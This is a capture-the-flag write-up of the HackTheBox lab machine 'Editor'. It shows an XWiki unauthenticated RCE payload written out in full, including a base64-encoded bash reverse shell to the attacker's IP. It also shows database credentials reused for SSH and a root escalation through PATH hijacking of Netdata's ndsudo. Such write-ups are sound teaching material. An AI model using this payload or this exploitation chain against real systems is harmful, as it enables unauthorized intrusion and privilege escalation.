---
title: "HTB: Editor"
date: 2025-12-24
categories: [HackTheBox, Machines]
tags: [Linux, HTB, machine, retired]
diffficulty: Easy
layout: post
author: memegamer138
github_username: memegamer138
---

## Executive Summary
Editor was an easy-difficulty Linux machine featuring an XWiki instance vulnerable to an unauthenticated remote code execution vulnerability (CVE-2025-24893). Initial foothold was gained by exploiting this vulnerability to obtain a reverse shell, which led to the discovery of database credentials in the XWiki configuration. These credentials allowed SSH access as the user 'oliver', revealing the user flag. Privilege escalation was achieved through a SUID binary (`ndsudo`) in the Netdata monitoring suite, which was vulnerable to path hijacking (CVE-2024-32019), ultimately granting root access and the root flag.

## Tools Used
- **Nmap**: Network reconnaissance and service enumeration
- **CVE-2025-24893 Exploit**: Unauthenticated RCE in XWiki 15.10.8
- **Netcat**: Reverse shell listener and network debugging
- **SSH**: Secure shell access using discovered credentials
- **CVE-2024-32019 Exploit**: Path hijacking in Netdata's ndsudo SUID binary
- **SCP**: Secure file transfer for privilege escalation payload
- **GCC**: Compiling the privilege escalation exploit


## Reconnaissance
Let us first perform an nmap scan of the IP.

```bash

└─$ nmap -O -sV 10.10.11.80
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-24 14:43 PST
Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 94.07% done; ETC: 14:43 (0:00:00 remaining)
Nmap scan report for 10.10.11.80
Host is up (0.13s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
8080/tcp open  http    Jetty 10.0.20
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.41 seconds
```

We see an open port 80 serving nginx; a web server. Let's add this to `/etc/hosts` and view the page.

![alt text](/assets/machines/editor/image-0.png)

From our nmap scan, we also know that there is something on port 8080, let's visit that too.

![alt text](/assets/machines/editor/image-1.png)

This shows an XWiki Page, and at the bottom, we cans ee its version `XWiki Debian 15.10.8 `

## Exploitation
On doing a simple search for CVEs, we can find [CVE-2025-24893 PoC](https://github.com/dollarboysushil/CVE-2025-24893-XWiki-Unauthenticated-RCE-Exploit-POC)

After cloning, we need to first open a netcat listener on some port. Then run the pthon script.

```bash
┌──(user㉿kali)-[~/Downloads/CVE-2025-24893-XWiki-Unauthenticated-RCE-Exploit-POC-main]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.17.24] from (UNKNOWN) [10.10.11.80] 41216
sh: 0: can't access tty; job control turned off
$ 
```

```bash
[?] Enter target URL (including http:// or https:// e.g http://10.10.10.18.10:8080): 10.10.11.80:8080
[?] Enter your IP address (for reverse shell): 10.10.17.24
[?] Enter the port number: 1337

[+] Crafting malicious reverse shell payload...

[+] Sample Format:
    http://target/xwiki/bin/get/Main/SolrSearch?media=rss&text=<payload>

[+] Final Exploit URL:
10.10.11.80:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async=false%7D%7D%7B%7Bgroovy%7D%7D%22bash%20-c%20%7Becho,YmFzaCAtYyAnc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuMjQvMTMzNyAwPiYxJw==%7D%7C%7Bbase64,-d%7D%7C%7Bbash,-i%7D%22.execute%28%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D

[+] Sending exploit via curl...

[+] Exploit delivered successfully! Check your listener.

[+] Done. Awaiting reverse shell connection on 10.10.17.24:1337 ...
```

![alt text](/assets/machines/editor/image.png)

After looking through a bunnch of files I ended up in `/usr/lib/xwiki-jetty/webapps/xwiki/WEB-INF`, over here i see a config file named `hibernate.cfg.xml`.

```bash
$ cat hibernate.cfg.xml | grep password
    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password"></property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password"></property>
```

The first entry seems quite interesting. But we don;t have a user yet..as we know all linux machines have a home folder for users..maybe we can look for one here.

```bash
$ find / -type d -name "home" 2>/dev/null
/home
$ cd /home
$ ls
oliver
```

Nice! We have a user we can use. If you remember our nmap scan, you'd have noticed that there was also an open SSH port. Let'ss use these creds to get in!

![alt text](/assets/machines/editor/image-2.png)

And we have the user flag! Now to get the root flag, we need to perform privilege escalation. Let's check for any misconfigured SUIDs that can give us root access.

## Priviliege Escalation
```bash
liver@editor:~$ find / -type f -perm -4000 2>/dev/null | grep -v "/proc\|/sys"
/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/usr/libexec/netdata/plugins.d/ioping
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
...
```

Hmm, ndsudo? netdata sudo? Sudo literally means running as root. Maybe this is they way in. After a quick search fr PoC we find [CVE-2024-32019](https://github.com/AzureADTrent/CVE-2024-32019-POC)

Let's follow the instructions. First, clone the repo. Then compile the binary using `gcc poc.c -o nvme`

Now, we need to send the compiled file to oliver. We can use `scp nvme oliver@editor.htb:/tmp/`

![alt text](/assets/machines/editor/image-3.png)

Then we make it an executable, and add this to path; this is so that ndsudo tries to run nvme, our malicuous script runs instead.

Finally `/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list` takes us to root!

![alt text](/assets/machines/editor/image-4.png)

### Lessons Learned
- **Configuration files** should never contain hardcoded credentials
- **SUID binaries** require careful review and minimal privilege assignment
- **External dependencies** (XWiki, Netdata) must be kept updated
- **Defense in depth**: Multiple vulnerabilities were chained (web → creds → SSH → SUID)